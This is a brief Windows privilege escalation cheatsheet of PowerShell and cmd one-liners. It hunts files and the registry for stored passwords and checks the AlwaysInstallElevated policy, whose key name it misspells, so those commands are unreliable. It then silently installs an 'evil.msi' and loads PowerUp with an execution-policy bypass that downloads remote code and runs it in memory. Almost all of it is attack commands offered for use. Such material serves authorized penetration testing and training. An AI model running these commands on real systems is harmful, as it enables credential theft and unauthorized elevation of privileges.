# Windows Privilege Escalation Cheatsheet

## List powershell module directories

```powershell
echo $Env:PSModulePath
```

## Download file

```powershell
Invoke-WebRequest http://url-to/file.ps1 -OutFile C:\path\to\file.ps1
```

## Search for passwords in filesystem

```shell
cmd style: dir /s *pass* == *cred* == *vnc* == *.config*
```

```powershell
powershell style: findstr /si password *.xml *.ini *.txt
```

```powershell
reg query HKLM /f password /t REG_SZ /s
```

```powershell
reg query HKCU /f password /t REG_SZ /s
```

## MSI register

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
```

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstalledElevated
```

If both return 1, then get an evil.msi and:

```powershell
msiexec /quiet /qn /i evil.msi
```

## Popular tools

### Load PowerUp

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```
